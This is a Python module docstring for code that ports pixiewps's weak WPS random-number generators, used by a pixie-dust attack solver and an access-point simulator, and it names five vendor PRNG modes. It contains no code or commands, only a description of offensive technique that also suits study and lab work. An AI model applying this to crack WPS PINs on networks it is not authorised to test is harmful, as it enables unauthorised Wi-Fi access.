"""The weak PRNGs used by vulnerable WPS implementations.

Every function here is a line-by-line port of the corresponding code in
pixiewps (https://github.com/wiire-a/pixiewps, GPL-3.0), which is the
reference for the offline pixie-dust attack and is what reaver shells out
to.  The functions operate on explicit state values (no hidden globals)
so they can be used both by the solver and by the AP simulator.

Modes (pixiewps numbering):

* ``RT`` (1)        — Ralink/MediaTek/CloudEngine: 32-bit LFSR
* ``ECOS_SIMPLE`` (2) — Broadcom eCos LCG (23-bit outputs)
* ``RTL819x`` (3)   — Realtek: glibc legacy ``srand``/``rand`` model
* ``ECOS_SIMPLEST`` (4) — eCos LCG, full 32-bit output
* ``ECOS_KNUTH`` (5)  — Minstd (Knuth) LCG
"""

